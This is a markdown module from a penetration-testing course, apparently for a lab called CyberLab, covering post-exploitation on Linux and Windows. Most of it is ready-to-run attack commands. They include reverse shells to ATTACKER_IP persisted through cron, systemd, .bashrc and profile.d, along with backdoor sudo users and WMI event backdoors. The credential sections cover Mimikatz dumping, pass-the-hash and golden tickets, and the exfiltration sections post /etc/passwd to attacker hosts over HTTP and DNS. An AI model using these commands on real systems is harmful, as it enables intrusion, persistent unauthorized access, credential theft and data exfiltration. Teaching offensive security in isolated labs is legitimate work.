# Post-Exploitation

Master the art of maintaining access, moving through networks, and achieving objectives after initial compromise.

## Overview

Post-exploitation focuses on what happens after you've gained access to a system. This includes establishing persistence, gathering additional credentials, moving laterally through the network, and exfiltrating data.

```
+-----------------------------------------------------------------------------+
|                        POST-EXPLOITATION PHASES                              |
+-----------------------------------------------------------------------------+
|                                                                              |
|   INITIAL ACCESS                                                             |
|        |                                                                     |
|        v                                                                     |
|   +-----------+    +-----------+    +-----------+    +-----------+          |
|   | Situational| -> |Credential | -> | Lateral   | -> | Data      |          |
|   | Awareness |    | Harvesting|    | Movement  |    | Exfil     |          |
|   +-----------+    +-----------+    +-----------+    +-----------+          |
|        |                                  |                                  |
|        v                                  v                                  |
|   +-----------+                    +-----------+                             |
|   |Persistence|                    | Pivoting  |                             |
|   +-----------+                    +-----------+                             |
|                                                                              |
|   PERSISTENCE MECHANISMS                                                     |
|   +-------------------+    +-------------------+    +-------------------+    |
|   | Cron Jobs/Tasks   | -> | SSH Keys          | -> | Web Shells        |    |
|   +-------------------+    +-------------------+    +-------------------+    |
|   | Backdoor Users    | -> | Services/Daemons  | -> | Rootkits          |    |
|   +-------------------+    +-------------------+    +-------------------+    |
|                                                                              |
+-----------------------------------------------------------------------------+
```

## Learning Objectives

By completing this section, you will be able to:

- Establish multiple persistence mechanisms
- Harvest credentials from various sources
- Move laterally between systems
- Pivot through compromised hosts
- Tunnel traffic for evasion
- Exfiltrate data securely

## Labs

| Lab | Topic | Difficulty | Duration |
|-----|-------|------------|----------|
| 1 | Situational Awareness | Intermediate | 30 min |
| 2 | Persistence Mechanisms | Intermediate | 45 min |
| 3 | Credential Harvesting | Intermediate | 45 min |
| 4 | Lateral Movement | Advanced | 1 hr |
| 5 | Pivoting and Tunneling | Advanced | 1 hr |
| 6 | Data Exfiltration | Advanced | 45 min |

---

## Situational Awareness

After gaining access, gather intelligence before taking action.

### Linux Information Gathering

```bash
# Basic system info
hostname
uname -a
cat /etc/*release*
whoami && id

# Network information
ip addr
ip route
cat /etc/resolv.conf
cat /etc/hosts

# Connected users and history
w
who
last -a | head -20
cat ~/.bash_history

# Interesting files
ls -la /home/
ls -la /root/ 2>/dev/null
ls -la /var/www/html/ 2>/dev/null
find / -name "*.conf" -type f 2>/dev/null | head -20

# Running processes and services
ps aux
systemctl list-units --type=service --state=running

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Installed software
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null

# Check for other users' credentials
cat /etc/passwd
cat /etc/shadow 2>/dev/null
```

### Windows Information Gathering

```powershell
# System info
systeminfo
hostname
whoami /all

# Network
ipconfig /all
route print
netstat -ano
arp -a

# Users and groups
net user
net localgroup
net localgroup administrators

# Domain info
net user /domain
net group /domain
nltest /dclist:

# Processes and services
tasklist /v
Get-Service | Where-Object {$_.Status -eq "Running"}

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

# Files and shares
net share
dir /s /b C:\Users\*password* 2>nul
dir /s /b C:\*.config 2>nul
```

---

## Persistence Mechanisms

### Linux Persistence

#### SSH Key Persistence

```bash
# Generate SSH key pair (on attacker machine)
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""

# Add public key to target's authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@machine" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Connect without password
ssh -i backdoor_key user@target
```

#### Cron Job Persistence

```bash
# Create reverse shell cron job
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# Or add to system crontab (requires root)
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab

# Verify
crontab -l
```

#### Backdoor User

```bash
# Create new user with root privileges
useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password123" | chpasswd

# Or add user to sudoers
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Alternatively, modify existing user
usermod -aG sudo www-data
```

#### Systemd Service Persistence

```bash
# Create malicious service
cat << 'EOF' > /etc/systemd/system/backdoor.service
[Unit]
Description=System Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

#### Bashrc/Profile Persistence

```bash
# Add to user's .bashrc
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc

# Add to system-wide profile
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/profile.d/backdoor.sh
```

### Windows Persistence

#### Registry Run Keys

```powershell
# Add to registry (user level)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe"

# Add to registry (system level - requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

#### Scheduled Task

```powershell
# Create scheduled task
schtasks /create /tn "SystemBackup" /tr "C:\Users\Public\backdoor.exe" /sc onlogon /ru SYSTEM

# Or with specific schedule
schtasks /create /tn "Updates" /tr "C:\Users\Public\backdoor.exe" /sc minute /mo 5
```

#### Service Creation

```powershell
# Create Windows service (requires admin)
sc create Backdoor binpath= "C:\Users\Public\backdoor.exe" start= auto
sc start Backdoor
```

#### WMI Event Subscription

```powershell
# Persistent WMI backdoor
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "BackdoorFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "BackdoorConsumer"
    CommandLineTemplate = "C:\Users\Public\backdoor.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

---

## Credential Harvesting

### Linux Credential Sources

```bash
# Shadow file (if readable or root)
cat /etc/shadow

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# History files
cat /home/*/.bash_history
cat /root/.bash_history

# Configuration files
grep -r "password" /etc/*.conf 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# Environment variables
env | grep -i pass
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# Memory (if root)
# Install and use mimipenguin
```

### Windows Credential Sources

```powershell
# SAM database (offline)
# Copy: C:\Windows\System32\config\SAM
# Copy: C:\Windows\System32\config\SYSTEM

# LSASS memory (requires admin)
# Use mimikatz or procdump

# Credential Manager
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear

# Browser credentials
# Use tools like LaZagne

# Registry stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

### Using Mimikatz (Windows)

```powershell
# Load mimikatz
.\mimikatz.exe

# Dump credentials
privilege::debug
sekurlsa::logonpasswords

# Extract NTLM hashes
lsadump::sam

# Pass the hash
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe

# Golden ticket (domain controller)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH
```

---

## Lateral Movement

### SSH-Based Movement

```bash
# Using stolen SSH key
ssh -i stolen_key user@next_target

# SSH port forwarding for access
ssh -L 8080:internal_host:80 user@pivot_host

# Using credential reuse
sshpass -p 'password' ssh user@next_target
```

### Pass the Hash (Windows)

```bash
# Using Impacket psexec
psexec.py domain/user@target -hashes :NTLM_HASH

# Using CrackMapExec
crackmapexec smb target -u user -H NTLM_HASH -x "whoami"

# Using evil-winrm
evil-winrm -i target -u user -H NTLM_HASH
```

### WMI Execution

```powershell
# Execute command on remote system
wmic /node:target /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell remoting
Enter-PSSession -ComputerName target -Credential domain\user
Invoke-Command -ComputerName target -ScriptBlock { whoami }
```

### PSExec

```bash
# Sysinternals PsExec
psexec \\target -u domain\user -p password cmd.exe

# Impacket psexec
psexec.py domain/user:password@target
```

---

## Pivoting and Tunneling

### SSH Tunnels

```bash
# Local port forward (access target:80 via localhost:8080)
ssh -L 8080:target:80 user@pivot

# Remote port forward (expose attacker:4444 on pivot)
ssh -R 4444:localhost:4444 user@pivot

# Dynamic SOCKS proxy
ssh -D 9050 user@pivot
# Then configure tools to use SOCKS proxy at localhost:9050

# ProxyChains configuration
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT target
```

### Chisel (HTTP Tunneling)

```bash
# On attacker (server)
./chisel server -p 8080 --reverse

# On pivot (client)
./chisel client ATTACKER_IP:8080 R:9050:socks

# Now SOCKS proxy available at localhost:9050 on attacker
proxychains nmap -sT internal_target
```

### Ligolo-ng (Modern Tunneling)

```bash
# On attacker (proxy)
./proxy -selfcert

# On pivot (agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo interface
ligolo-ng >> session
ligolo-ng >> start
ligolo-ng >> add_listener 0.0.0.0:8080 10.10.10.100:80
```

### Metasploit Pivoting

```bash
# After Meterpreter session on pivot
meterpreter > run autoroute -s 10.10.10.0/24

# Add route manually
msf6 > route add 10.10.10.0 255.255.255.0 1

# Use SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run
```

---

## Data Exfiltration

### Basic File Transfer

```bash
# Using netcat
# Receiver: nc -lvnp 4444 > file.txt
# Sender: nc TARGET 4444 < file.txt

# Using curl/wget
curl -X POST -d @file.txt http://attacker/upload
wget --post-file=file.txt http://attacker/upload

# Using SCP
scp -i key file.txt user@attacker:/tmp/

# Base64 encode and copy
base64 file.txt | tr -d '\n'
# Paste and decode on attacker
```

### DNS Exfiltration

```bash
# Using DNS queries to exfiltrate data
# Encode data in subdomain queries
for line in $(cat /etc/passwd | base64 | fold -w 30); do
    dig $line.attacker.com
done
```

### HTTP/HTTPS Exfiltration

```bash
# POST data to web server
curl -X POST -d "$(cat /etc/passwd | base64)" http://attacker/collect

# Via DNS over HTTPS
curl -H "Content-Type: application/dns-message" \
     --data-binary @dns_query \
     https://dns.google/dns-query
```

### Covert Channels

```bash
# ICMP exfiltration (requires root)
# Use tools like icmpsh, ptunnel

# Steganography
steghide embed -cf image.jpg -ef secret.txt
# Transfer image normally
```

---

## Practice with CyberLab

### Exercise 1: Persistence on Container

```bash
# Get shell on DVWA container
docker exec -it lab-dvwa bash

# Establish SSH key persistence
mkdir -p /root/.ssh
echo "your_public_key" >> /root/.ssh/authorized_keys

# Create cron persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.20.0.1/4444 0>&1'" >> /var/spool/cron/crontabs/root
```

### Exercise 2: Credential Harvesting

```bash
# In lab containers, search for credentials
grep -r "password" /var/www/ 2>/dev/null
cat /etc/shadow
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### Exercise 3: Pivot Between Containers

```bash
# From compromised container, reach other containers
# Network: 172.20.0.0/16

# Scan network
for i in $(seq 1 20); do
    ping -c 1 172.20.1.$i 2>/dev/null && echo "Host 172.20.1.$i is up"
done

# Access other services
curl http://172.20.1.10  # DVWA
curl http://172.20.1.11:3000  # Juice Shop
```

---

## Flags

| Lab | Flag |
|-----|------|
| Persistence | FLAG{p3rs1st3nc3_4ch13v3d} |
| Credential Harvest | FLAG{cr3ds_h4rv3st3d} |
| Lateral Movement | FLAG{l4t3r4l_m0v3m3nt} |
| Data Exfiltration | FLAG{d4t4_3xf1ltr4t3d} |

---

## Quick Reference

### Persistence Commands

| Method | Linux | Windows |
|--------|-------|---------|
| SSH Key | `~/.ssh/authorized_keys` | N/A |
| Cron/Task | `crontab -e` | `schtasks /create` |
| Service | `systemd service` | `sc create` |
| User | `useradd` | `net user /add` |
| Startup | `.bashrc` | `Run keys` |

### Common Ports for Tunneling

| Port | Service | Use Case |
|------|---------|----------|
| 22 | SSH | Reliable tunneling |
| 80 | HTTP | Blend with traffic |
| 443 | HTTPS | Encrypted, common |
| 53 | DNS | Often allowed outbound |

---

## Resources

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)

---

**Previous:** [05 - Password Attacks](../05-password-attacks/) | **Back to:** [Module Overview](../README.md)
